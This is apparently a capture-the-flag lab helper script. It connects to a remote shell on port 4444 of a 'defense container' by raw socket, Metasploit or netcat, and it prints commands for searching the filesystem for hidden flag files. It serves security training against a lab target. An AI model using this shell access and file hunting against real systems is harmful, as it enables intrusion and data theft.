#!/usr/bin/env python3
"""
Metasploit Connection Helper

This script shows how to programmatically connect to the defense container
using Metasploit's API or directly via sockets.
"""

import os
import socket
import time
import subprocess
import sys

def banner():
    """Display the script banner"""
    print("=" * 70)
    print("Metasploit Connection Helper".center(70))
    print("=" * 70)
    print("\nThis script demonstrates different ways to connect to the target:")
    print(" 1. Direct socket connection")
    print(" 2. Using Metasploit to connect to target")
    print(" 3. Using Metasploit with advanced options")
    print("\nChoose an option or press Ctrl+C to exit")
    print("=" * 70)

def direct_connect():
    """Establish a direct socket connection to the target"""
    host = os.environ.get('DEFENSE_CONTAINER_HOST', 'localhost')
    port = 4444
    
    print(f"[*] Connecting directly to {host}:{port}")
    
    try:
        # Create a socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        print("[+] Connected successfully!")
        print("[*] Type commands to send to the remote shell")
        print("[*] Type 'exit' to close the connection")
        
        # Set non-blocking for stdin
        import fcntl, select
        old_flags = fcntl.fcntl(sys.stdin.fileno(), fcntl.F_GETFL)
        fcntl.fcntl(sys.stdin.fileno(), fcntl.F_SETFL, old_flags | os.O_NONBLOCK)
        
        # Simple interactive shell
        while True:
            # Check for data from socket
            ready_to_read, _, _ = select.select([s, sys.stdin], [], [], 0.1)
            
            if s in ready_to_read:
                data = s.recv(4096)
                if not data:  # Connection closed
                    print("\n[-] Connection closed by remote host")
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
                
            if sys.stdin in ready_to_read:
                cmd = sys.stdin.readline().strip()
                if cmd.lower() == 'exit':
                    break
                s.sendall((cmd + '\n').encode())
        
        s.close()
        print("[*] Connection closed")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")

def use_metasploit_connect():
    """Use Metasploit to connect to the target"""
    host = os.environ.get('DEFENSE_CONTAINER_HOST', 'localhost')
    
    print("[*] Creating Metasploit resource script for connection...")
    with open('/tmp/connect.rc', 'w') as f:
        f.write(f"use auxiliary/scanner/socket/tcp_connect\n")
        f.write(f"set RHOSTS {host}\n")
        f.write(f"set RPORT 4444\n")
        f.write(f"run\n")
        f.write(f"echo -e \"\\n[*] Now connecting to the shell with netcat...\\n\"\n")
        f.write(f"echo -e \"[*] Type 'exit' to close the connection when done\\n\"\n")
    
    print("[*] Launching Metasploit to verify the connection...")
    print("[*] After verification, netcat will be used for the actual connection")
    
    try:
        # First run the Metasploit verification
        subprocess.run(["msfconsole", "-q", "-r", "/tmp/connect.rc"])
        
        # Then connect with netcat
        print("\n[*] Now connecting with netcat...")
        subprocess.run(["nc", host, "4444"])
    except KeyboardInterrupt:
        print("\n[!] Connection interrupted by user")
    except Exception as e:
        print(f"[-] Error during connection: {e}")

def use_advanced_metasploit():
    """Use Metasploit with more advanced options"""
    host = os.environ.get('DEFENSE_CONTAINER_HOST', 'localhost')
    
    print("[*] Starting Metasploit console...")
    print("[*] Use the following commands once in the console:")
    print("=" * 70)
    print(f"use auxiliary/scanner/socket/tcp_connect")
    print(f"set RHOSTS {host}")
    print(f"set RPORT 4444")
    print(f"run")
    print("\n# Then exit Metasploit and connect with netcat:")
    print(f"nc {host} 4444")
    print("=" * 70)
    
    try:
        # Launch an interactive Metasploit console
        subprocess.run(["msfconsole"])
    except KeyboardInterrupt:
        print("\n[!] Metasploit execution interrupted")
    except Exception as e:
        print(f"[-] Error launching Metasploit: {e}")

def find_flags():
    """Print helpful commands for finding flags"""
    print("\n[*] Helpful commands for finding flags once connected:")
    print("=" * 70)
    print("find / -name \"*flag*\" 2>/dev/null")
    print("grep -r \"CTF{\" / 2>/dev/null")
    print("find / -type f -size -100c -exec grep -l \"CTF\" {} \\; 2>/dev/null")
    print("ls -la /home/user/")
    print("ls -la /var/secret_location/")
    print("cat /home/user/flag.txt")
    print("cat /var/secret_location/.hidden_flag.txt")
    print("=" * 70)

def main():
    """Main function"""
    banner()
    
    try:
        choice = input("\nEnter your choice (1-3): ")
        
        if choice == '1':
            direct_connect()
        elif choice == '2':
            use_metasploit_connect()
        elif choice == '3':
            use_advanced_metasploit()
        else:
            print("[-] Invalid choice")
        
        find_flags()
            
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    
if __name__ == "__main__":
    main() 